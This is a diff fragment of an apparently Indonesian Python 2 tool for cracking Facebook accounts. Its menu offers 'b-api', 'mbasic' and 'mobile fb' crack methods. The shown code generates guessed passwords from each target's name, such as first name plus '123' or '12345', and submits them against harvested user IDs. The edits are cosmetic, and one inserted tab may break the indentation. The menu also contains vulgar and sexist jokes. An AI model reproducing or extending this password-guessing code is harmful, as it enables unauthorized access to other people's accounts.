@@ -255,14 +255,14 @@ class ngentod:
                             os.remove(self.apk);exit()
                         else:
                             print ('\n %s[•] isi yang benar kentod'%(M));zona()
-                    print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack]\n'%(P)
+                    print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack \x1b[0;97m]\n'%(P)
                     print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mCepet kaya rosi\x1b[0;97m]'%(K,P)
                     print '[%s2%s] Metode mbasic [\x1b[0;92mLambat kaya disuruh emak\x1b[0;97m]'%(K,P)
                     print '[%s3%s] Metode mobile fb [\x1b[0;92mSangat lambat kaya cewe\x1b[0;97m]'%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
-            print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack]\n'%(P)
+            print '\n%s[ Silahkan pilih \x1b[0;93mmetode crack \x1b[0;97m]\n'%(P)
             print '\x1b[0;97m[%s1%s] Metode b-api [\x1b[0;92mCepet kaya rosi\x1b[0;97m]'%(K,P)
             print '[%s2%s] Metode mbasic [\x1b[0;92mLambat kaya disuruh emak\x1b[0;97m]'%(K,P)
             print '[%s3%s] Metode mobile fb [\x1b[0;92mSangat lambat kaya cewe\x1b[0;97m]'%(K,P)
@@ -299,7 +299,7 @@ class ngentod:
                         uid, name = akun.split('<=>')
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
-                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
+                        	pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                         log.submit(self.basic, uid, pwx)
